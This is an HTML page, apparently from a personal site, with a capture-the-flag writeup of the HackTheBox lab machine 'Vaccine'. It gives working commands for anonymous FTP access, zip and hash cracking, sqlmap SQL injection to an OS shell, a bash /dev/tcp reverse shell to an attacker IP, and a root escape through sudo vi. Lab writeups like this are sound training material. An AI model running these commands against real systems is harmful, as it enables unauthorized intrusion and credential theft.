@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+  <title>Vaccine | Alberto Erbusti</title>
+  <meta name="description" content="Writeup for HackTheBox Vaccine. FTP anonymous login, zip cracking, SQLi with sqlmap, and root via vi GTFOBins through sudo misconfiguration.">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+
+  <nav>
+    <a class="nav-logo" href="../index.html"><span>~/</span>albierbi</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../writeups/" class="active">Writeups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <div class="writeup-hero">
+    <div class="writeup-hero-inner">
+      <div class="writeup-back">
+        <a href="../writeups/">&larr; all writeups</a>
+      </div>
+      <div class="writeup-meta-top">
+        <span class="platform-badge badge-htb">HackTheBox</span>
+        <span class="diff-badge diff-easy">easy</span>
+      </div>
+      <h1 class="writeup-title">Vaccine</h1>
+      <p class="writeup-subtitle">Anonymous FTP login leaks a password-protected zip, cracked with zip2john and john. MD5 hash in source code gives web access, then sqlmap OS shell via SQLi. Root through a vi GTFOBins escape on a misconfigured sudo rule.</p>
+      <div class="writeup-tags">
+        <span class="tag">ftp</span>
+        <span class="tag">hash-cracking</span>
+        <span class="tag">sqli</span>
+        <span class="tag">sqlmap</span>
+        <span class="tag">web</span>
+        <span class="tag">sudo</span>
+        <span class="tag">gtfobins</span>
+        <span class="tag">privesc</span>
+      </div>
+      <div class="writeup-date">Completed &mdash; 2026-05-25</div>
+    </div>
+  </div>
+
+  <div class="writeup-body">
+
+    <aside class="writeup-toc">
+      <div class="toc-label">// contents</div>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#ftp">FTP &amp; Zip Cracking</a></li>
+        <li><a href="#web">Web Login</a></li>
+        <li><a href="#foothold">Foothold — SQLi Shell</a></li>
+        <li><a href="#privesc">Privilege Escalation</a></li>
+        <li><a href="#takeaways">Takeaways</a></li>
+      </ul>
+    </aside>
+
+    <article class="writeup-content">
+
+      <section id="recon">
+        <h2>Recon</h2>
+        <p>Started with a standard Nmap scan.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>nmap -sV -sC 10.129.2.223</pre>
+        </div>
+        <div class="info-grid">
+          <div class="info-row"><span class="port">21</span><span class="service">FTP</span></div>
+          <div class="info-row"><span class="port">22</span><span class="service">SSH</span></div>
+          <div class="info-row"><span class="port">80</span><span class="service">HTTP</span></div>
+        </div>
+        <p>Port 80 served a web login page. Default credentials didn't work. Port 21 was more interesting.</p>
+      </section>
+
+      <section id="ftp">
+        <h2>FTP &amp; Zip Cracking</h2>
+        <p>FTP allowed anonymous login and contained a single file: <code>backup.zip</code>.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>ftp 10.129.2.223
+# Login: anonymous / (blank)
+get backup.zip</pre>
+        </div>
+        <p>The zip was password-protected. Used <code>zip2john</code> to extract the hash, then cracked it with <code>john</code>.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>zip2john backup.zip > backup.hash
+john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john backup.hash --show</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Password cracked</div>
+          <p>Zip password: <code>741852963</code></p>
+        </div>
+        <p>Extracted the archive and found <code>index.php</code>. Inside, the login logic compared the submitted password against a hardcoded MD5 hash.</p>
+        <div class="code-block">
+          <div class="code-label">php</div>
+          <pre>if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")</pre>
+        </div>
+        <p>Cracked the MD5 hash using an online lookup.</p>
+        <div class="callout callout-success">
+          <div class="callout-title">Admin credentials recovered</div>
+          <p><code>admin : qwerty789</code></p>
+        </div>
+      </section>
+
+      <section id="web">
+        <h2>Web Login</h2>
+        <p>Logged into the site with the recovered credentials. The dashboard showed a car catalogue with a search function. The search query was reflected directly in the URL as <code>?search=</code>, a strong hint at SQL injection.</p>
+      </section>
+
+      <section id="foothold">
+        <h2>Foothold — SQLi OS Shell</h2>
+        <p>Used sqlmap with the session cookie to confirm and exploit the injection.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>sqlmap -u "http://10.129.2.223/dashboard.php?search=any" \
+  --cookie="PHPSESSID=&lt;your_session_cookie&gt;" \
+  --os-shell</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">GET parameter 'search' confirmed injectable</div>
+          <p>sqlmap landed an OS shell. Upgraded to a proper reverse shell:</p>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker — set up listener
+nc -lvnp 443
+
+# In sqlmap OS shell — send reverse shell
+bash -c "bash -i >& /dev/tcp/10.10.16.29/443 0>&1"</pre>
+        </div>
+        <p>Got a shell as <code>postgres</code>. Upgraded it to a full TTY:</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# ctrl+z
+stty raw -echo; fg</pre>
+        </div>
+        <div class="callout callout-info">
+          <div class="callout-title">Note on session stability</div>
+          <p>The machine kicked us if we strayed too far from the expected working directory. Moving quickly to exfil credentials and SSH in for a stable session was the right call.</p>
+        </div>
+        <p>Found plaintext database credentials in <code>/var/www/html/dashboard.php</code>:</p>
+        <div class="code-block">
+          <div class="code-label">php</div>
+          <pre>$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Credentials found</div>
+          <p><code>postgres : P@s5w0rd!</code></p>
+        </div>
+        <p>Used them to SSH in for a stable session before getting kicked.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>ssh postgres@10.129.2.223</pre>
+        </div>
+      </section>
+
+      <section id="privesc">
+        <h2>Privilege Escalation, sudo + vi GTFOBins</h2>
+        <p>Checked SUID binaries, nothing useful. Moved on to sudo permissions.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>sudo -l</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Sudo rule found</div>
+          <p><code>postgres</code> could run <code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code> as root.</p>
+        </div>
+        <p>Opened the file with sudo vi, then used the GTFOBins vi escape to spawn a root shell from within the editor.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</pre>
+        </div>
+        <div class="code-block">
+          <div class="code-label">vi</div>
+          <pre># Inside vi:
+:set shell=/bin/bash
+:shell</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Root shell</div>
+        </div>
+      </section>
+
+      <section id="takeaways">
+        <h2>Takeaways</h2>
+        <div class="callout callout-info">
+          <div class="callout-title">Key lessons</div>
+          <ul>
+            <li>Always test FTP for anonymous login, it's a common oversight that leaks sensitive files</li>
+            <li>Source code in backup archives often contains hardcoded credentials or hashes worth cracking</li>
+            <li>Web apps running on a database server almost always store credentials in plaintext in <code>/var/www/html</code>, check there first for privesc</li>
+            <li>Any <code>sudo</code> rule allowing a text editor can be escaped via GTFOBins, vi, nano, less, and others all have shell spawning techniques</li>
+            <li>When a reverse shell is unstable, look for credentials immediately and SSH in for a persistent session</li>
+          </ul>
+        </div>
+      </section>
+
+    </article>
+  </div>
+
+  <footer>
+    <span>&copy; 2026 Alberto Erbusti</span>
+    <a href="../writeups/" class="footer-back">&larr; back to writeups</a>
+  </footer>
+
+</body>
+</html>
